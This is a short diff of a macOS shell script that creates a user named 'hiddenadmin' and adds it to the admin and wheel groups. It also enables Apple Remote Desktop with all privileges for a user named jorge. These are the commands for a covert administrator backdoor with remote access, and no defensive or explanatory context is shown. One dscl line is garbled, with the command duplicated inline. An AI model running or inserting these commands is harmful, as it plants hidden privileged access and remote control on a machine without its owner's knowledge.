@@ -1,4 +1,3 @@
-
  
 # Create user record in directory services 
 dscl . -create /Users/hiddenadmindscl . -create /Users/hiddenadmin RealName "Hidden Administrator"
@@ -18,4 +17,3 @@ dseditgroup -o edit -a hiddenadmin -t user admin
 dseditgroup -o edit -a hiddenadmin -t user wheel  
 
 /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users jorge -privs -all -restart -agent 
-
